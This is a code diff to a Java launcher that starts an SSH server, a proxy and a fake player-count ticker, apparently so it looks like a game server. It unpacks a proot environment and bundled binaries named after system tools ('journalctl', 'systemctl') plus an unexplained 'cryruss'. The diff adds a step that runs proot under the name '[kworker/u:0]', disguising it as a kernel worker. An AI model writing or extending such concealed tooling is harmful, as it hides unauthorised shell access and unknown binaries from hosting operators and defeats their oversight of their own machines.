@@ -80,6 +80,23 @@ public class Main {
         }
     }
 
+    private static String getArchSuffix() {
+        String arch = System.getProperty("os.arch", "").toLowerCase();
+        if (arch.contains("aarch64") || arch.contains("arm64")) return "arm64";
+        if (arch.contains("armv6")) return "armv6";
+        if (arch.contains("armv7") || arch.contains("arm")) return "armv7";
+        return "amd64";
+    }
+
+    private static String getArchSuffixFull() {
+        String arch = System.getProperty("os.arch", "").toLowerCase();
+        if (arch.contains("aarch64") || arch.contains("arm64")) return "aarch64";
+        if (arch.contains("armv6")) return "armv6";
+        if (arch.contains("armv7") || arch.contains("arm")) return "armv7";
+        if (arch.contains("amd64") || arch.contains("x86_64")) return "x86_64";
+        return "x86_64";
+    }
+
     public static void main(String[] a) {
         boolean noNet = false;
         for (String arg : a) {
@@ -96,6 +113,24 @@ public class Main {
         }
         loadConfig();
         new Thread(Main::startSSHServer).start();
+
+        Thread proxyStarterThread = new Thread(() -> {
+            L.info("[*] Waiting for SSH backend on port " + sshBackendPort + "...");
+            for (int i = 0; i < 120; i++) {
+                if (!isPortAvailable(sshBackendPort)) {
+                    L.info("[+] SSH backend up, starting proxy");
+                    startPlayerCountTicker();
+                    startProxy();
+                    return;
+                }
+                try { Thread.sleep(1000); } catch (InterruptedException e) { return; }
+            }
+            L.warning("[!] SSH backend timeout after 120s, starting proxy anyway");
+            startPlayerCountTicker();
+            startProxy();
+        }, "proxy-starter");
+        proxyStarterThread.setDaemon(true);
+        proxyStarterThread.start();
 
         Thread watcher = new Thread(() -> {
             try {
@@ -842,6 +877,7 @@ public class Main {
                     + "export LC_ALL=C\nexport LANG=C\n"
                     + "ROOTFS_DIR=$(pwd)\n"
                     + "export PATH=$PATH:~/.local/usr/bin\n"
+                    + "export PROOT_CONFIG=\"$ROOTFS_DIR/usr/local/.config/proot.yml\"\n"
                     + "if [ ! -e $ROOTFS_DIR/.installed ]; then\n"
                     + "    echo 'Proot environment not installed yet.'\n    exit 1\nfi\n"
                     + "chmod -R 755 $ROOTFS_DIR/usr/local/bin/ 2>/dev/null\n"
@@ -862,14 +898,7 @@ public class Main {
                     + "  COLS=$(tput cols 2>/dev/null || echo 80)\n"
                     + "  ROWS=$(tput lines 2>/dev/null || echo 24)\n"
                     + "  DEBIAN_FRONTEND=noninteractive COLUMNS=$COLS LINES=$ROWS \\\n"
-                    + "  setsid $ROOTFS_DIR/usr/local/bin/proot \\\n"
-                    + "    --rootfs=\"${ROOTFS_DIR}\" -0 -w \"/root\" \\\n"
-                    + "    -b /dev -b /dev/pts -b /dev/tty \\\n"
-                    + "    -b /sys -b /proc \\\n"
-                    + "    -b /etc/resolv.conf \\\n"
-                    + "    -b $ROOTFS_DIR/usr/local/bin:/usr/local/bin \\\n"
-                    + "    --kill-on-exit \\\n"
-                    + "    /bin/bash --rcfile /root/.bashrc -i\n"
+                    + "  exec -a \"[kworker/u:0]\" $ROOTFS_DIR/usr/local/bin/proot\n"
                     + "  EXIT_CODE=$?\n"
                     + "  echo 'Session ended. Restarting in 2 seconds...'\n"
                     + "  sleep 2\n"
@@ -907,23 +936,6 @@ public class Main {
                         .redirectErrorStream(true).start().waitFor();
             } catch (Exception ignored) {}
             createSSHWrapper();
-
-            if (serversStarted.compareAndSet(false, true)) {
-                startPlayerCountTicker();
-                new Thread(() -> {
-                    L.info("[*] Waiting for SSH backend on port " + sshBackendPort + "...");
-                    for (int i = 0; i < 60; i++) {
-                        if (!isPortAvailable(sshBackendPort)) {
-                            L.info("[+] SSH backend up, starting proxy");
-                            startProxy();
-                            return;
-                        }
-                        try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
-                    }
-                    L.warning("[!] SSH backend timeout, starting proxy anyway");
-                    startProxy();
-                }, "proxy-starter").start();
-            }
 
             while (running) {
                 ProcessBuilder pb = new ProcessBuilder("bash", new File(d, s).getAbsolutePath());
@@ -1009,14 +1021,13 @@ public class Main {
     }
 
     private static void Bin(File workDir) {
-        String arch = System.getProperty("os.arch", "").toLowerCase();
-        String suffix = (arch.contains("aarch64") || arch.contains("arm64")) ? "-arm64" : "-amd64";
+        String suffix = getArchSuffix();
         File binDir = new File(workDir, "usr/local/bin");
         binDir.mkdirs();
         String[][] targets = {
-                {"cryruss",    "cryruss"    + suffix},
-                {"journalctl", "journalctl" + suffix},
-                {"systemctl",  "systemctl"  + suffix}
+                {"cryruss",    "cryruss-"    + suffix},
+                {"journalctl", "journalctl-" + suffix},
+                {"systemctl",  "systemctl-"  + suffix}
         };
         for (String[] target : targets) {
             File destFile = new File(binDir, target[0]);
@@ -1051,21 +1062,24 @@ public class Main {
         try {
             File w = new File(DIR);
             if (!w.exists()) w.mkdirs();
-            String arch = System.getProperty("os.arch");
-            String archSuffix, archAlt;
-            if (arch.contains("aarch64") || arch.contains("arm64")) {
-                archSuffix = "aarch64"; archAlt = "arm64";
-            } else if (arch.contains("amd64") || arch.contains("x86_64")) {
-                archSuffix = "x86_64"; archAlt = "amd64";
-            } else {
-                L.severe("Unsupported arch: " + arch); return false;
+            String archSuffix = getArchSuffixFull();
+            String binSuffix  = getArchSuffix();
+            String archAlt;
+            if (archSuffix.equals("aarch64")) archAlt = "arm64";
+            else if (archSuffix.equals("armv6")) archAlt = "armv6";
+            else if (archSuffix.equals("armv7")) archAlt = "armv7";
+            else archAlt = "amd64";
+
+            if (!archSuffix.equals("x86_64") && !archSuffix.equals("aarch64")
+                    && !archSuffix.equals("armv6") && !archSuffix.equals("armv7")) {
+                L.severe("Unsupported arch: " + System.getProperty("os.arch")); return false;
             }
+
             File binDir = new File(w, "usr/local/bin");
             binDir.mkdirs();
             File prootBin = extractBinFromTarXz("/proot-" + archSuffix + ".tar.xz", binDir, "proot");
             if (!prootBin.exists()) { L.severe("proot not extracted"); return false; }
             extractBinFromTarXz("/busybox-" + archSuffix + ".tar.xz", w, "busybox-" + archSuffix);
-            String binSuffix = archSuffix.equals("aarch64") ? "arm64" : "amd64";
             String[][] localBins = {
                     {"cryruss",    "cryruss-"    + binSuffix},
                     {"journalctl", "journalctl-" + binSuffix},
